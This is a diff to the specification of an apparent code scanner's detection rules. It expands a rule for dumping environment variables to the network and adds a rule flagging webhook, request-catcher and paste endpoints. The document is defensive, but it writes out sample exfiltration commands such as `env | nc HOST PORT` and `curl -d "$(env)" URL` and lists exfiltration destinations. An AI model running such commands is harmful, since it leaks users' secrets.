@@ -70,10 +70,45 @@ requests\.(post|put|patch|get|request)\s*\([^)]*\b(os\.environ|process\.env)\b
 fetch\s*\([^)]*\{[^}]*body\s*:\s*JSON\.stringify\s*\(\s*process\.env\s*\)
 httpx\.(post|put|patch|get|request)\s*\([^)]*\bos\.environ\b
 ```
-Plus shell: `curl\s+[^|]*--data\s+@?<?\(?env\)?`
+Plus shell. An environment dump is `env`, `printenv`, `export -p`, or `set`
+with no arguments. `printenv PATH` prints one value and does not match.
+- The dump in a command substitution (`$(env)`, `` `env` ``) or a process
+  substitution (`<(env)`), quoted or unquoted, as the value of a curl or wget
+  data flag: `-d`, `--data`, `--data-ascii`, `--data-binary`, `--data-raw`,
+  `--data-urlencode`, `-F`, `--form`, `--post-data`, `--body-data`. Examples:
+  `curl -X POST -d "$(env)" URL`, `curl --data @<(env) URL`,
+  `curl -F "vars=$(set)" URL`, `wget --post-data="$(printenv)" URL`.
+- The dump piped into a network client that reads stdin, with up to three
+  stages between them: `env | curl -d @- URL`,
+  `printenv | base64 | curl --data-binary @- URL`,
+  `env | wget --post-file=/dev/stdin URL`, `env | nc HOST PORT`.
 
 Malicious fixture shape: a `.py` file that sends `os.environ` to an IP.
-Benign fixture: reads a single env var and uses it locally.
+Benign fixture: reads a single env var and uses it locally, and posts a static
+JSON body to an ordinary API.
+
+### NET-WEBHOOK-KNOWN (Critical)
+URLs in code and markdown that deliver data to a chat webhook, a request
+catcher, or a paste upload API:
+- Chat webhooks (`https://`): `discord.com/api/webhooks/`,
+  `discord.com/api/channels/<id>/messages`, `hooks.slack.com/services/`,
+  `api.telegram.org/bot<token>/`, `ntfy.sh/`.
+- Request catchers with the bin token in the path (`http://` or `https://`):
+  `webhook.site/<token>`, `requestbin.net/<token>`, `requestbin.com/<token>`,
+  `requestb.in/<token>`, `hookb.in/<token>`.
+- Request catchers with the bin token in a subdomain (`http://` or
+  `https://`): `<token>.webhook.site`, `<token>.requestbin.net`,
+  `<token>.requestbin.com`, `<token>.m.pipedream.net`,
+  `<token>.x.pipedream.net`, `<token>.requestcatcher.com`,
+  `<token>.beeceptor.com`, and the interactsh hosts `<token>.interact.sh` and
+  `<token>.oast.fun`, `.oast.live`, `.oast.me`, `.oast.online`, `.oast.pro`,
+  `.oast.site`.
+- Raw paste upload (`http://` or `https://`): `pastebin.com/api/api_post.php`.
+
+A service home page without a bin token (`https://webhook.site`,
+`https://www.requestbin.com`) and a host name without a URL scheme do not
+match, so docs can name these services. Security-education sections in
+markdown stay masked.
 
 ### PI-EXFIL-TRIGGER-CLAUSE (Critical)
 In `.md` files (SKILL.md, AGENTS.md, etc.):
@@ -138,10 +173,9 @@ Read `SPEC.md` §4 for these — they follow the same shape as above.
 JS eval/Function(), child_process with shell:true, pickle/yaml.load,
 backtick command substitution.
 
-**Network (5 more):** cloud credential metadata endpoints, outbound non-local
-IP literal, known-exfil webhooks (`requestbin`, `webhook.site`, raw pastebin),
-raw socket creation, DNS lookups to unusual TLDs (`.xyz`, `.tk`, `.top`,
-IP-literal).
+**Network (4 more):** cloud credential metadata endpoints, outbound non-local
+IP literal, raw socket creation, DNS lookups to unusual TLDs (`.xyz`, `.tk`,
+`.top`, IP-literal).
 
 **Filesystem (5 more):** browser credential/cookie stores, macOS keychain
 access, reads of `.env` files, relative paths escaping `cwd` (`../../..`),
